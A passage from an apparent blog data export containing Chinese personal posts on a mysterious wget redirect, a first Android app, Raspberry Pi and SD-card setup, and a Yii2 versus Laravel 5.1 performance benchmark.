rel=\"noopener\">http://124.205.69.137/files/40050000012FFD2C/cn2.php.net/distributions/php-5.6.10.tar.gz</a> [跟随至新的 URL]<br>–2015-07-15 15:24:37–  <a href=\"http://124.205.69.137/files/40050000012FFD2C/cn2.php.net/distributions/php-5.6.10.tar.gz\" target=\"_blank\" rel=\"noopener\">http://124.205.69.137/files/40050000012FFD2C/cn2.php.net/distributions/php-5.6.10.tar.gz</a><br>正在连接 124.205.69.137:80… 已连接。<br>已发出 HTTP 请求，正在等待回应… 200 OK<br>长度：18306403 (17M) [application/octet-stream]<br>正在保存至: “php-5.6.10.tar.gz.2”</pre></p>\n<p>php-5.6.10.tar.gz.2  82%[=================&gt;    ]  14.45M  3.59MB/s   eta 1s<br><br>刚开始没注意，还以为国外的服务器速度这么快，原来是跳转了。</p>\n<p>而服务端的nginx的配置，就是一个普通网站</p>\n<p><pre class=\"\">server {<br>    listen 80;<br>    server_name package.xiaoai.me;<br>    root /srv/package;</pre></p>\n<pre><code>access_log logs/package.xiaoai.me.access.log;\n\nlocation / {\n    index index.html;\n}\n</code></pre><p>}<br><br>nginx的日志显示的是200，不是302:</p>\n<p><pre>xx.xx.xx.xx - - [15/Jul/2015:15:24:37 +0800] “GET /php-5.6.10.tar.gz HTTP/1.1” 200 15488 “-“ “Wget/1.16.1 (linux-gnu)”<br></pre><br>&nbsp;</p>\n<p>那这个302从哪里来的，未解之迷。暂时记录下，有时间看看</p>\n","site":{"data":{}},"excerpt":"","more":"<p>尝试从自己的服务器下载一些包文件，服务端也正常响应200，但wget却奇怪的收到302跳转请求。</p>\n<p>客户端下载的命令</p>\n<p><pre class=\"\">$ wget <a href=\"http://package.xiaoai.me/php-5.6.10.tar.gz\" target=\"_blank\" rel=\"noopener\">http://package.xiaoai.me/php-5.6.10.tar.gz</a> –no-cache –no-dns-cache<br>–2015-07-15 15:24:37–  <a href=\"http://package.xiaoai.me/php-5.6.10.tar.gz\" target=\"_blank\" rel=\"noopener\">http://package.xiaoai.me/php-5.6.10.tar.gz</a><br>正在解析主机 package.xiaoai.me (package.xiaoai.me)… 104.155.200.103<br>正在连接 package.xiaoai.me (package.xiaoai.me)|104.155.200.103|:80… 已连接。<br>已发出 HTTP 请求，正在等待回应… 302 Found<br>位置：<a href=\"http://124.205.69.137/files/40050000012FFD2C/cn2.php.net/distributions/php-5.6.10.tar.gz\" target=\"_blank\" rel=\"noopener\">http://124.205.69.137/files/40050000012FFD2C/cn2.php.net/distributions/php-5.6.10.tar.gz</a> [跟随至新的 URL]<br>–2015-07-15 15:24:37–  <a href=\"http://124.205.69.137/files/40050000012FFD2C/cn2.php.net/distributions/php-5.6.10.tar.gz\" target=\"_blank\" rel=\"noopener\">http://124.205.69.137/files/40050000012FFD2C/cn2.php.net/distributions/php-5.6.10.tar.gz</a><br>正在连接 124.205.69.137:80… 已连接。<br>已发出 HTTP 请求，正在等待回应… 200 OK<br>长度：18306403 (17M) [application/octet-stream]<br>正在保存至: “php-5.6.10.tar.gz.2”</pre></p>\n<p>php-5.6.10.tar.gz.2  82%[=================&gt;    ]  14.45M  3.59MB/s   eta 1s<br><br>刚开始没注意，还以为国外的服务器速度这么快，原来是跳转了。</p>\n<p>而服务端的nginx的配置，就是一个普通网站</p>\n<p><pre class=\"\">server {<br>    listen 80;<br>    server_name package.xiaoai.me;<br>    root /srv/package;</pre></p>\n<pre><code>access_log logs/package.xiaoai.me.access.log;\n\nlocation / {\n    index index.html;\n}\n</code></pre><p>}<br><br>nginx的日志显示的是200，不是302:</p>\n<p><pre>xx.xx.xx.xx - - [15/Jul/2015:15:24:37 +0800] “GET /php-5.6.10.tar.gz HTTP/1.1” 200 15488 “-“ “Wget/1.16.1 (linux-gnu)”<br></pre><br>&nbsp;</p>\n<p>那这个302从哪里来的，未解之迷。暂时记录下，有时间看看</p>\n"},{"title":"记我的第一个安卓应用","id":"130","date":"2015-07-18T14:32:06.000Z","_content":"\n开始学习安卓，先试试做一个hello,world\n\n### 创建\n\n安装了Android Studio后，一键生成了HelloWorld的程序．\n\n程序命名我取作 **com.joaner.helloworld**．以后新的应用都在**com.joaner**下了．\n\n### **打包**\n\n我开启了手机的USB调试，但Studio无法识别到，只好生成APK文件来手工安装．\n\n### 运行\n\n[![Screenshot_2015-07-18-22-12-41](https://xiaoai.me/wp-content/uploads/2015/07/Screenshot_2015-07-18-22-12-41-169x300.png)](https://xiaoai.me/wp-content/uploads/2015/07/Screenshot_2015-07-18-22-12-41.png)","source":"_posts/e8-ae-b0-e6-88-91-e7-9a-84-e7-ac-ac-e4-b8-80-e4-b8-aa-e5-ae-89-e5-8d-93-e5-ba-94-e7-94-a8.md","raw":"---\ntitle: 记我的第一个安卓应用\nid: 130\ncategories:\n  - Android\ndate: 2015-07-18 22:32:06\ntags:\n---\n\n开始学习安卓，先试试做一个hello,world\n\n### 创建\n\n安装了Android Studio后，一键生成了HelloWorld的程序．\n\n程序命名我取作 **com.joaner.helloworld**．以后新的应用都在**com.joaner**下了．\n\n### **打包**\n\n我开启了手机的USB调试，但Studio无法识别到，只好生成APK文件来手工安装．\n\n### 运行\n\n[![Screenshot_2015-07-18-22-12-41](https://xiaoai.me/wp-content/uploads/2015/07/Screenshot_2015-07-18-22-12-41-169x300.png)](https://xiaoai.me/wp-content/uploads/2015/07/Screenshot_2015-07-18-22-12-41.png)","slug":"e8-ae-b0-e6-88-91-e7-9a-84-e7-ac-ac-e4-b8-80-e4-b8-aa-e5-ae-89-e5-8d-93-e5-ba-94-e7-94-a8","published":1,"updated":"2018-03-05T11:32:58.735Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cilf00gngmlmpfro3h8b","content":"<p>开始学习安卓，先试试做一个hello,world</p>\n<h3 id=\"创建\"><a href=\"#创建\" class=\"headerlink\" title=\"创建\"></a>创建</h3><p>安装了Android Studio后，一键生成了HelloWorld的程序．</p>\n<p>程序命名我取作 <strong>com.joaner.helloworld</strong>．以后新的应用都在<strong>com.joaner</strong>下了．</p>\n<h3 id=\"打包\"><a href=\"#打包\" class=\"headerlink\" title=\"打包\"></a><strong>打包</strong></h3><p>我开启了手机的USB调试，但Studio无法识别到，只好生成APK文件来手工安装．</p>\n<h3 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h3><p><a href=\"https://xiaoai.me/wp-content/uploads/2015/07/Screenshot_2015-07-18-22-12-41.png\" target=\"_blank\" rel=\"noopener\"><img src=\"https://xiaoai.me/wp-content/uploads/2015/07/Screenshot_2015-07-18-22-12-41-169x300.png\" alt=\"Screenshot_2015-07-18-22-12-41\"></a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>开始学习安卓，先试试做一个hello,world</p>\n<h3 id=\"创建\"><a href=\"#创建\" class=\"headerlink\" title=\"创建\"></a>创建</h3><p>安装了Android Studio后，一键生成了HelloWorld的程序．</p>\n<p>程序命名我取作 <strong>com.joaner.helloworld</strong>．以后新的应用都在<strong>com.joaner</strong>下了．</p>\n<h3 id=\"打包\"><a href=\"#打包\" class=\"headerlink\" title=\"打包\"></a><strong>打包</strong></h3><p>我开启了手机的USB调试，但Studio无法识别到，只好生成APK文件来手工安装．</p>\n<h3 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h3><p><a href=\"https://xiaoai.me/wp-content/uploads/2015/07/Screenshot_2015-07-18-22-12-41.png\" target=\"_blank\" rel=\"noopener\"><img src=\"https://xiaoai.me/wp-content/uploads/2015/07/Screenshot_2015-07-18-22-12-41-169x300.png\" alt=\"Screenshot_2015-07-18-22-12-41\"></a></p>\n"},{"title":"树莓派入门相关资源","id":"149","date":"2015-07-31T16:39:07.000Z","_content":"\n开始折腾树莓派了，这是我的一些总结：\n\n### 刻录SD镜像\n\n未成功，按照官网的说明来做，但没有启动系统，索性从淘宝上买了一个做好的SD卡。\n\n### SSH连接树莓派\n\n    $ ssh pi@树莓派在局域网的地址\n    password:raspberry\n\n参考自：[http://gaozp.github.io/tec/2015/07/25/raspberry.html](http://gaozp.github.io/tec/2015/07/25/raspberry.html) 。不过这里面的wifi密码设置等我照着做了没连接成功，可能我的方法有问题。\n\n### 远程桌面\n\n我使用RDP连接方法，在树莓派上安装\n<pre>sudo apt-get install xrdp</pre>\n我的fedora22作为客户端，它自带了远程桌面查看器，用它的RDP协议即可连接，不用设置端口什么的，只需要账户密码，就是上面的 pi raspberry。\n\n### 扩展存储\n\n我的SD有16G，但系统默认只使用4G，参考以下文章的步骤即可使用全部空间\n\n[调整你的sd卡分割区的大小](http://www.rs-online.com/designspark/electronics/knowledge-item/raspberry-pi---%E8%B0%83%E6%95%B4%E4%BD%A0%E7%9A%84sd%E5%8D%A1%E5%88%86%E5%89%B2%E5%8C%BA%E7%9A%84%E5%A4%A7%E5%B0%8F)\n\n唯一有出入的是我的系统没有swap分区，不过照做没问题，以后再加swap\n\n### 静态IP\n\n我在树莓派上没有设置成功，只好在路由器上配置。\n\n&nbsp;\n\n&nbsp;","source":"_posts/e6-a0-91-e8-8e-93-e6-b4-be-e5-85-a5-e9-97-a8-e7-9b-b8-e5-85-b3-e8-b5-84-e6-ba-90.md","raw":"---\ntitle: 树莓派入门相关资源\nid: 149\ncategories:\n  - linux\ndate: 2015-08-01 00:39:07\ntags:\n---\n\n开始折腾树莓派了，这是我的一些总结：\n\n### 刻录SD镜像\n\n未成功，按照官网的说明来做，但没有启动系统，索性从淘宝上买了一个做好的SD卡。\n\n### SSH连接树莓派\n\n    $ ssh pi@树莓派在局域网的地址\n    password:raspberry\n\n参考自：[http://gaozp.github.io/tec/2015/07/25/raspberry.html](http://gaozp.github.io/tec/2015/07/25/raspberry.html) 。不过这里面的wifi密码设置等我照着做了没连接成功，可能我的方法有问题。\n\n### 远程桌面\n\n我使用RDP连接方法，在树莓派上安装\n<pre>sudo apt-get install xrdp</pre>\n我的fedora22作为客户端，它自带了远程桌面查看器，用它的RDP协议即可连接，不用设置端口什么的，只需要账户密码，就是上面的 pi raspberry。\n\n### 扩展存储\n\n我的SD有16G，但系统默认只使用4G，参考以下文章的步骤即可使用全部空间\n\n[调整你的sd卡分割区的大小](http://www.rs-online.com/designspark/electronics/knowledge-item/raspberry-pi---%E8%B0%83%E6%95%B4%E4%BD%A0%E7%9A%84sd%E5%8D%A1%E5%88%86%E5%89%B2%E5%8C%BA%E7%9A%84%E5%A4%A7%E5%B0%8F)\n\n唯一有出入的是我的系统没有swap分区，不过照做没问题，以后再加swap\n\n### 静态IP\n\n我在树莓派上没有设置成功，只好在路由器上配置。\n\n&nbsp;\n\n&nbsp;","slug":"e6-a0-91-e8-8e-93-e6-b4-be-e5-85-a5-e9-97-a8-e7-9b-b8-e5-85-b3-e8-b5-84-e6-ba-90","published":1,"updated":"2018-03-05T11:32:58.735Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cils00gtgmlmdxv1un3a","content":"<p>开始折腾树莓派了，这是我的一些总结：</p>\n<h3 id=\"刻录SD镜像\"><a href=\"#刻录SD镜像\" class=\"headerlink\" title=\"刻录SD镜像\"></a>刻录SD镜像</h3><p>未成功，按照官网的说明来做，但没有启动系统，索性从淘宝上买了一个做好的SD卡。</p>\n<h3 id=\"SSH连接树莓派\"><a href=\"#SSH连接树莓派\" class=\"headerlink\" title=\"SSH连接树莓派\"></a>SSH连接树莓派</h3><pre><code>$ ssh pi@树莓派在局域网的地址\npassword:raspberry\n</code></pre><p>参考自：<a href=\"http://gaozp.github.io/tec/2015/07/25/raspberry.html\" target=\"_blank\" rel=\"noopener\">http://gaozp.github.io/tec/2015/07/25/raspberry.html</a> 。不过这里面的wifi密码设置等我照着做了没连接成功，可能我的方法有问题。</p>\n<h3 id=\"远程桌面\"><a href=\"#远程桌面\" class=\"headerlink\" title=\"远程桌面\"></a>远程桌面</h3><p>我使用RDP连接方法，在树莓派上安装</p>\n<p><pre>sudo apt-get install xrdp</pre><br>我的fedora22作为客户端，它自带了远程桌面查看器，用它的RDP协议即可连接，不用设置端口什么的，只需要账户密码，就是上面的 pi raspberry。</p>\n<h3 id=\"扩展存储\"><a href=\"#扩展存储\" class=\"headerlink\" title=\"扩展存储\"></a>扩展存储</h3><p>我的SD有16G，但系统默认只使用4G，参考以下文章的步骤即可使用全部空间</p>\n<p><a href=\"http://www.rs-online.com/designspark/electronics/knowledge-item/raspberry-pi---%E8%B0%83%E6%95%B4%E4%BD%A0%E7%9A%84sd%E5%8D%A1%E5%88%86%E5%89%B2%E5%8C%BA%E7%9A%84%E5%A4%A7%E5%B0%8F\" target=\"_blank\" rel=\"noopener\">调整你的sd卡分割区的大小</a></p>\n<p>唯一有出入的是我的系统没有swap分区，不过照做没问题，以后再加swap</p>\n<h3 id=\"静态IP\"><a href=\"#静态IP\" class=\"headerlink\" title=\"静态IP\"></a>静态IP</h3><p>我在树莓派上没有设置成功，只好在路由器上配置。</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n","site":{"data":{}},"excerpt":"","more":"<p>开始折腾树莓派了，这是我的一些总结：</p>\n<h3 id=\"刻录SD镜像\"><a href=\"#刻录SD镜像\" class=\"headerlink\" title=\"刻录SD镜像\"></a>刻录SD镜像</h3><p>未成功，按照官网的说明来做，但没有启动系统，索性从淘宝上买了一个做好的SD卡。</p>\n<h3 id=\"SSH连接树莓派\"><a href=\"#SSH连接树莓派\" class=\"headerlink\" title=\"SSH连接树莓派\"></a>SSH连接树莓派</h3><pre><code>$ ssh pi@树莓派在局域网的地址\npassword:raspberry\n</code></pre><p>参考自：<a href=\"http://gaozp.github.io/tec/2015/07/25/raspberry.html\" target=\"_blank\" rel=\"noopener\">http://gaozp.github.io/tec/2015/07/25/raspberry.html</a> 。不过这里面的wifi密码设置等我照着做了没连接成功，可能我的方法有问题。</p>\n<h3 id=\"远程桌面\"><a href=\"#远程桌面\" class=\"headerlink\" title=\"远程桌面\"></a>远程桌面</h3><p>我使用RDP连接方法，在树莓派上安装</p>\n<p><pre>sudo apt-get install xrdp</pre><br>我的fedora22作为客户端，它自带了远程桌面查看器，用它的RDP协议即可连接，不用设置端口什么的，只需要账户密码，就是上面的 pi raspberry。</p>\n<h3 id=\"扩展存储\"><a href=\"#扩展存储\" class=\"headerlink\" title=\"扩展存储\"></a>扩展存储</h3><p>我的SD有16G，但系统默认只使用4G，参考以下文章的步骤即可使用全部空间</p>\n<p><a href=\"http://www.rs-online.com/designspark/electronics/knowledge-item/raspberry-pi---%E8%B0%83%E6%95%B4%E4%BD%A0%E7%9A%84sd%E5%8D%A1%E5%88%86%E5%89%B2%E5%8C%BA%E7%9A%84%E5%A4%A7%E5%B0%8F\" target=\"_blank\" rel=\"noopener\">调整你的sd卡分割区的大小</a></p>\n<p>唯一有出入的是我的系统没有swap分区，不过照做没问题，以后再加swap</p>\n<h3 id=\"静态IP\"><a href=\"#静态IP\" class=\"headerlink\" title=\"静态IP\"></a>静态IP</h3><p>我在树莓派上没有设置成功，只好在路由器上配置。</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n"},{"title":"linux下SD卡无法挂载","id":"147","date":"2015-07-30T14:50:41.000Z","_content":"\n这两天用SD卡给树莓派制作系统，但一直没成功，插入SD卡灯也不闪烁，总是亮着。\n\n而烧录好镜像后的SD卡，无法再挂载在linux上了，我的系统是Fedora22，能听到插入的系统提示音，但无法看到SD卡的文件系统。所以只好格式化SD卡：\n\n1\\. 找到SD卡的设备：\n<pre>sudo fdisk -l</pre>\n按照容量我的SD卡在 **/dev/sdb**\n\n2\\. 格式化为FAT32类型，这是所有系统通用的\n<pre>sudo mkdosfs -F 32 -I /dev/sdb</pre>\n完成后重新插拔即可看到SD卡的文件系统。\n\n接下来又反复折腾。。。","source":"_posts/linux-e4-b8-8bsd-e5-8d-a1-e6-97-a0-e6-b3-95-e6-8c-82-e8-bd-bd.md","raw":"---\ntitle: linux下SD卡无法挂载\nid: 147\ncategories:\n  - linux\ndate: 2015-07-30 22:50:41\ntags:\n---\n\n这两天用SD卡给树莓派制作系统，但一直没成功，插入SD卡灯也不闪烁，总是亮着。\n\n而烧录好镜像后的SD卡，无法再挂载在linux上了，我的系统是Fedora22，能听到插入的系统提示音，但无法看到SD卡的文件系统。所以只好格式化SD卡：\n\n1\\. 找到SD卡的设备：\n<pre>sudo fdisk -l</pre>\n按照容量我的SD卡在 **/dev/sdb**\n\n2\\. 格式化为FAT32类型，这是所有系统通用的\n<pre>sudo mkdosfs -F 32 -I /dev/sdb</pre>\n完成后重新插拔即可看到SD卡的文件系统。\n\n接下来又反复折腾。。。","slug":"linux-e4-b8-8bsd-e5-8d-a1-e6-97-a0-e6-b3-95-e6-8c-82-e8-bd-bd","published":1,"updated":"2018-03-05T11:32:58.735Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cilv00gugmlm1x18g5x8","content":"<p>这两天用SD卡给树莓派制作系统，但一直没成功，插入SD卡灯也不闪烁，总是亮着。</p>\n<p>而烧录好镜像后的SD卡，无法再挂载在linux上了，我的系统是Fedora22，能听到插入的系统提示音，但无法看到SD卡的文件系统。所以只好格式化SD卡：</p>\n<p>1. 找到SD卡的设备：</p>\n<p><pre>sudo fdisk -l</pre><br>按照容量我的SD卡在 <strong>/dev/sdb</strong></p>\n<p>2. 格式化为FAT32类型，这是所有系统通用的</p>\n<p><pre>sudo mkdosfs -F 32 -I /dev/sdb</pre><br>完成后重新插拔即可看到SD卡的文件系统。</p>\n<p>接下来又反复折腾。。。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>这两天用SD卡给树莓派制作系统，但一直没成功，插入SD卡灯也不闪烁，总是亮着。</p>\n<p>而烧录好镜像后的SD卡，无法再挂载在linux上了，我的系统是Fedora22，能听到插入的系统提示音，但无法看到SD卡的文件系统。所以只好格式化SD卡：</p>\n<p>1. 找到SD卡的设备：</p>\n<p><pre>sudo fdisk -l</pre><br>按照容量我的SD卡在 <strong>/dev/sdb</strong></p>\n<p>2. 格式化为FAT32类型，这是所有系统通用的</p>\n<p><pre>sudo mkdosfs -F 32 -I /dev/sdb</pre><br>完成后重新插拔即可看到SD卡的文件系统。</p>\n<p>接下来又反复折腾。。。</p>\n"},{"title":"yii2和laravel5.1性能比较","id":"159","date":"2015-08-02T09:29:07.000Z","_content":"\n周末对yii2和laravel5.1进行了简单的性能测试，结果是yii2比laravel5.1快很多。\n\n## 测试环境\n\n### 系统\n\n*   Fedora 22\n*   linux: Linux 4.0.8-300.fc22.x86_64\n*   gcc: 版本 5.1.1 20150618 (Red Hat 5.1.1-4) (GCC)\n*   Mem: 8 GiB\n*   cpu: Intel® Core™ i7-4702MQ CPU @ 2.20GHz × 8\n\n### 框架\n\n*   laravel 5.1\n*   yii 2.0 (basic类型，它和advanced区别主要在于目录结构，就是少include了两三个配置文件，性能差距不大)\n\n### 环境\n\n*   统一都是生产环境，关闭了debug。\n*   语言包等其他配置都选用默认的配置\n\n### 测试代码\n\n定义一个新的控制器，简单的输出 hello 字符\n\n## 测试\n\n我每次用**ab -n 3000**来测试，分成多次交叉测试，得出的结果都差不多。\n\n### 结果\n\n在默认情况下，简单的输出hello程序下，yii2的性能是laravel5.1的4倍多！\n\n我原先以为差不了多少，但真的很意外。不过laravel我不太熟悉，也许有哪些可以优化的地方，但在默认配置下，yii2确实完爆laravel。\n\n当然评价框架不能只看性能，我用yii2做过三四个项目，它在功能和设计方面也很强大，扩展性十足。是我最爱的框架！\n\n## 不公平的地方\n\nyii2默认不会设置session和XSRF-TOKEN，但laravel会，所以主要性能差距应该就是这个造成的。但从设计上，yii2总是按需加载，只有当使用视图的**ActiveForm**时它才会主动设置**XSRF**，显然比laravel要灵活。\n\n所以我也给yii加上了启用session的代码：`\\Yii::$app-&gt;session-&gt;open();`，但仍然比laravel快4倍多。结果见最下。\n\n## 原因\n\n至于为什么差距这么大，下次有时间再看吧。已知的差别：\n\n*   laravel自己实现了session，比起yii2用的原生的要慢，但可能安全性更高。\n&nbsp;\n\n### 附测试数据\n\nab测试3000次请求，这里各列出随机的一组测试\n\n#### laravel 5.1\n\n<pre>$ ab -n 3000 http://laravel.localhost/test\nConcurrency Level:      1\nTime taken for tests:   19.507 seconds\nComplete requests:      3000\nFailed requests:        0\nTotal transferred:      2952398 bytes\nHTML transferred:       15000 bytes\nRequests per second:    153.79 [#/sec] (mean)\nTime per request:       6.502 [ms] (mean)\nTime per request:       6.502 [ms] (mean, across all concurrent requests)\nTransfer rate:          147.81 [Kbytes/sec] received\n</pre>\n\n#### Yii 2.0 （默认配置，不开启session）\n\n<pre>$ ab -n 3000 http://yii2.localhost/test\nConcurrency Level:      1\nTime taken for tests:   4.456 seconds\nComplete requests:      3000\nFailed requests:        0\nTotal transferred:      501000 bytes\nHTML transferred:       15000 bytes\nRequests per second:    673.24 [#/sec] (mean)\nTime per request:       1.485 [ms] (mean)\nTime per request:       1.485 [ms] (mean, across all concurrent requests)\nTransfer rate:          109.80 [Kbytes/sec] received\n</pre>\n\n#### Yii 2.0 （为了和laravel保持一致，所以也开启session）\n\n<pre>Concurrency Level:      1\nTime taken for tests:   5.045 seconds\nComplete requests:      3000\nFailed requests:        0\nTotal transferred:      1116000 bytes\nHTML transferred:       15000 bytes\nRequests per second:    594.67 [#/sec] (mean)\nTime per request:       1.682 [ms] (mean)\nTime per request:       1.682 [ms] (mean, across all concurrent requests)\nTransfer rate:          216.03 [Kbytes/sec] received</pre>\n&nbsp;","source":"_posts/yii2-e5-92-8claravel5-1-e6-80-a7-e8-83-bd-e6-af-94-e8-be-83.md","raw":"---\ntitle: yii2和laravel5.1性能比较\nid: 159\ncategories:\n  - php\ndate: 2015-08-02 17:29:07\ntags:\n---\n\n周末对yii2和laravel5.1进行了简单的性能测试，结果是yii2比laravel5.1快很多。\n\n## 测试环境\n\n### 系统\n\n*   Fedora 22\n*   linux: Linux 4.0.8-300.fc22.x86_64\n*   gcc: 版本 5.1.1 20150618 (Red Hat 5.1.1-4) (GCC)\n*   Mem: 8 GiB\n*   cpu: Intel® Core™ i7-4702MQ CPU @ 2.20GHz × 8\n\n### 框架\n\n*   laravel 5.1\n*   yii 2.0 (basic类型，它和advanced区别主要在于目录结构，就是少include了两三个配置文件，性能差距不大)\n\n### 环境\n\n*   统一都是生产环境，关闭了debug。\n*   语言包等其他配置都选用默认的配置\n\n### 测试代码\n\n定义一个新的控制器，简单的输出 hello 字符\n\n## 测试\n\n我每次用**ab -n 3000**来测试，分成多次交叉测试，得出的结果都差不多。\n\n### 结果\n\n在默认情况下，简单的输出hello程序下，yii2的性能是laravel5.1的4倍多！\n\n我原先以为差不了多少，但真的很意外。不过laravel我不太熟悉，也许有哪些可以优化的地方，但在默认配置下，yii2确实完爆laravel。\n\n当然评价框架不能只看性能，我用yii2做过三四个项目，它在功能和设计方面也很强大，扩展性十足。是我最爱的框架！\n\n## 不公平的地方\n\nyii2默认不会设置session和XSRF-TOKEN，但laravel会，所以主要性能差距应该就是这个造成的。但从设计上，yii2总是按需加载，只有当使用视图的**ActiveForm**时它才会主动设置**XSRF**，显然比laravel要灵活。\n\n所以我也给yii加上了启用session的代码：`\\Yii::$app-&gt;session-&gt;open();`，但仍然比laravel快4倍多。结果见最下。\n\n## 原因\n\n至于为什么差距这么大，下次有时间再看吧。已知的差别：\n\n*   laravel自己实现了session，比起yii2用的原生的要慢，但可能安全性更高。\n&nbsp;\n\n### 附测试数据\n\nab测试3000次请求，这里各列出随机的一组测试\n\n#### laravel 5.1\n\n<pre>$ ab -n 3000 http://laravel.localhost/test\nConcurrency Level:      1\nTime taken for tests:   19.507 seconds\nComplete requests:      3000\nFailed requests:        0\nTotal transferred:      2952398 bytes\nHTML transferred:       15000 bytes\nRequests per second:    153.79 [#/sec] (mean)\nTime per request:       6.502 [ms] (mean)\nTime per request:       6.502 [ms] (mean, across all concurrent requests)\nTransfer rate:          147.81 [Kbytes/sec] received\n</pre>\n\n#### Yii 2.0 （默认配置，不开启session）\n\n<pre>$ ab -n 3000 http://yii2.localhost/test\nConcurrency Level:      1\nTime taken for tests:   4.456 seconds\nComplete requests:      3000\nFailed requests:        0\nTotal transferred:      501000 bytes\nHTML transferred:       15000 bytes\nRequests per second:    673.24 [#/sec] (mean)\nTime per request:       1.485 [ms] (mean)\nTime per request:       1.485 [ms] (mean, across all concurrent requests)\nTransfer rate:          109.80 [Kbytes/sec] received\n</pre>\n\n#### Yii 2.0 （为了和laravel保持一致，所以也开启session）\n\n<pre>Concurrency Level:      1\nTime taken for tests:   5.045 seconds\nComplete requests:      3000\nFailed requests:        0\nTotal transferred:      1116000 bytes\nHTML transferred:       15000 bytes\nRequests per second:    594.67 [#/sec] (mean)\nTime per request:       1.682 [ms] (mean)\nTime per request:       1.682 [ms] (mean, across all concurrent requests)\nTransfer rate:          216.03 [Kbytes/sec] received</pre>\n&nbsp;","slug":"yii2-e5-92-8claravel5-1-e6-80-a7-e8-83-bd-e6-af-94-e8-be-83","published":1,"updated":"2018-03-05T11:32:58.735Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cilw00gvgmlmadx54o7b","content":"<p>周末对yii2和laravel5.1进行了简单的性能测试，结果是yii2比laravel5.1快很多。</p>\n<h2 id=\"测试环境\"><a href=\"#测试环境\" class=\"headerlink\" title=\"测试环境\"></a>测试环境</h2><h3 id=\"系统\"><a href=\"#系统\" class=\"headerlink\" title=\"系统\"></a>系统</h3><ul>\n<li>Fedora 22</li>\n<li>linux: Linux 4.0.8-300.fc22.x86_64</li>\n<li>gcc: 版本 5.1.1 20150618 (Red Hat 5.1.1-4) (GCC)</li>\n<li>Mem: 8 GiB</li>\n<li>cpu: Intel® Core™ i7-4702MQ CPU @ 2.20GHz × 8</li>\n</ul>\n<h3 id=\"框架\"><a href=\"#框架\" class=\"headerlink\" title=\"框架\"></a>框架</h3><ul>\n<li>laravel 5.1</li>\n<li>yii 2.0 (basic类型，它和advanced区别主要在于目录结构，就是少include了两三个配置文件，性能差距不大)</li>\n</ul>\n<h3 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h3><ul>\n<li>统一都是生产环境，关闭了debug。</li>\n<li>语言包等其他配置都选用默认的配置</li>\n</ul>\n<h3 id=\"测试代码\"><a href=\"#测试代码\" class=\"headerlink\" title=\"测试代码\"></a>测试代码</h3><p>定义一个新的控制器，简单的输出 hello 字符</p>\n<h2 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h2><p>我每次用<strong>ab -n 3000</strong>来测试，分成多次交叉测试，得出的结果都差不多。</p>\n<h3 id=\"结果\"><a href=\"#结果\" class=\"headerlink\" title=\"结果\"></a>结果</h3><p>在默认情况下，简单的输出hello程序下，yii2的性能是laravel5.1的4倍多！</p>\n<p>我原先以为差不了多少，但真的很意外。不过laravel我不太熟悉，也许有哪些可以优化的地方，但在默认配置下，yii2确实完爆laravel。</p>\n<p>当然评价框架不能只看性能，我用yii2做过三四个项目，它在功能和设计方面也很强大，扩展性十足。是我最爱的框架！</p>\n<h2 id=\"不公平的地方\"><a href=\"#不公平的地方\" class=\"headerlink\" title=\"不公平的地方\"></a>不公平的地方</h2><p>yii2默认不会设置session和XSRF-TOKEN，但laravel会，所以主要性能差距应该就是这个造成的。但从设计上，yii2总是按需加载，只有当使用视图的<strong>ActiveForm</strong>时它才会主动设置<strong>XSRF</strong>，显然比laravel要灵活。</p>\n<p>所以我也给yii加上了启用session的代码：<code>\\Yii::$app-&amp;gt;session-&amp;gt;open();</code>，但仍然比laravel快4倍多。结果见最下。</p>\n<h2 id=\"原因\"><a href=\"#原因\" class=\"headerlink\" title=\"原因\"></a>原因</h2><p>至于为什么差距这么大，下次有时间再看吧。已知的差别：</p>\n<ul>\n<li>laravel自己实现了session，比起yii2用的原生的要慢，但可能安全性更高。<br>&nbsp;</li>\n</ul>\n<h3 id=\"附测试数据\"><a href=\"#附测试数据\" class=\"headerlink\" title=\"附测试数据\"></a>附测试数据</h3><p>ab测试3000次请求，这里各列出随机的一组测试</p>\n<h4 id=\"laravel-5-1\"><a href=\"#laravel-5-1\" class=\"headerlink\" title=\"laravel 5.1\"></a>laravel 5.1</h4><pre>$ ab -n 3000 http://laravel.localhost/test\nConcurrency Level:      1\nTime taken for tests:   19.507 seconds\nComplete requests:      3000\nFailed requests:        0\nTotal transferred:      2952398 bytes\nHTML transferred:       15000 bytes\nRequests per second:    153.79 [#/sec] (mean)\nTime per request:       6.502 [ms] (mean)\nTime per request:       6.502 [ms] (mean, across all concurrent requests)\nTransfer rate:          147.81 [Kbytes/sec] received\n</pre>\n\n<h4 id=\"Yii-2-0-（默认配置，不开启session）\"><a href=\"#Yii-2-0-（默认配置，不开启session）\" class=\"headerlink\" title=\"Yii 2.0 （默认配置，不开启session）\"></a>Yii 2.0 （默认配置，不开启session）</h4><pre>$ ab -n 3000 http://yii2.localhost/test\nConcurrency Level:      1\nTime taken for tests:   4.456 seconds\nComplete requests:      3000\nFailed requests:        0\nTotal transferred:      501000 bytes\nHTML transferred:       15000 bytes\nRequests per second:    673.24 [#/sec] (mean)\nTime per request:       1.485 [ms] (mean)\nTime per request:       1.485 [ms] (mean, across all concurrent requests)\nTransfer rate:          109.80 [Kbytes/sec] received\n</pre>\n\n<h4 id=\"Yii-2-0-（为了和laravel保持一致，所以也开启session）\"><a href=\"#Yii-2-0-（为了和laravel保持一致，所以也开启session）\" class=\"headerlink\" title=\"Yii 2.0 （为了和laravel保持一致，所以也开启session）\"></a>Yii 2.0 （为了和laravel保持一致，所以也开启session）</h4><p><pre>Concurrency Level:      1<br>Time taken for tests:   5.045 seconds<br>Complete requests:      3000<br>Failed requests:        0<br>Total transferred:      1116000 bytes<br>HTML transferred:       15000 bytes<br>Requests per second:    594.67 [#/sec] 